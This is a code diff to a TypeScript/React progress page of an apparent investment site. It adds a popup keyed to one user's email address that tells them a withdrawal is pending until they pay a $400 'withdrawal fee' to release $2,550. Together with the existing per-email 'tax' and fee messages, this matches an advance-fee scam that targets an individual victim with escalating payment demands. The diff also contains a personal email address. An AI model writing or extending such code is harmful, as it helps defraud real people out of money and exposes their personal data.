@@ -158,6 +158,10 @@ const WITHDRAWAL_SUCCESS_POPUP_BY_EMAIL: Record<string, string> = {
   "samlebrun01@gmail.com":
     "Congratulations for clearing tax. Your money will be sent to your wallet, but clear the withdrawal fee of $400.00. Amount to be transferred to your wallet: $2,550.00."
 };
+const TAX_CLEARED_POPUP_BY_EMAIL: Record<string, string> = {
+  "samlebrun01@gmail.com":
+    "Withdrawal pending. Clear withdrawal fee of $400.00 to release $2,550.00 to your wallet."
+};
 const USER_PLAN_OVERRIDE_BY_EMAIL: Record<
   string,
   {
@@ -1024,7 +1028,10 @@ export default function ProgressPage() {
       if (localStorage.getItem(key) === "1") return;
       localStorage.setItem(key, "1");
     } catch {}
-    setTaxClearedPopup("Your investments will reflect on your wallet. Thank you for Trusting In Us");
+    const userEmailLower = String(user.email || "").toLowerCase();
+    setTaxClearedPopup(
+      TAX_CLEARED_POPUP_BY_EMAIL[userEmailLower] || "Your investments will reflect on your wallet. Thank you for Trusting In Us"
+    );
   }, [user, plan, popupTaxDue, popupTaxRemaining]);
 
   if (user === undefined) {
